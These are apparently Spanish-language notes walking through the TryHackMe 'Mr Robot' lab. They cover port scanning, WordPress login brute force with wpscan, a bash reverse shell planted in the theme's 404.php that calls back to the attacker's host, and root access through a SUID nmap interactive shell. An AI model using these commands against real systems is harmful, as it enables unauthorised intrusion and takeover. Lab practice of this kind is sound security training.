https://tryhackme.com/r/room/mrrobot
# Fase de reconocimiento
## Buscamos puertos abiertos
```
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.10.88.41
```
![[Pasted image 20240602185415.png]]
## Reconocimiento de servicios
```
nmap -sCV -p22,80,443 10.10.88.41
```
![[Pasted image 20240602185536.png]]
## Fuzzing
```
gobuster dir -u http://10.10.88.41 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30
```
![[Pasted image 20240602185850.png]]
Encontramos un diccionario
![[Pasted image 20240602190157.png]]

# Fase de ataque
## Wordpress
Hacemos Brute force sobre el login para encontrar el usuario con el diccionario encontrado.
![[Pasted image 20240602190701.png]]
Por la longitud de la respuesta vemos que el usuario elliot es valido
![[Pasted image 20240602191354.png]]
![[Pasted image 20240602191538.png]]
## Brute force password
Con el diccionario dado
```
wpscan --url http://10.10.88.41/wp-login.php -U elliot -P fsocity.dic
```
![[Pasted image 20240602195404.png]]Logging con wp_yura
## Reverse Shell
Editamos el Tema 404.php e insertamos una reverse shell
```
system("bash -c 'bash -i >& /dev/tcp/10.9.0.36/443 0>&1'");
```
![[Pasted image 20240531190415.png]]
Nos ponemos en escucha por el puerto 443
```
nc -nlvp 443
```
[-] ==pwned!==
# Privilege Escalation
Numeramos archivos con permisos
```
find \-perm -4000 2>/dev/null
```
Encontramos nmap y con https://gtfobins.github.io/gtfobins/nmap/ hacemos la escalada
```
/usr/local/bin/nmap --interactive
	!sh
```
[+] ==pwned!==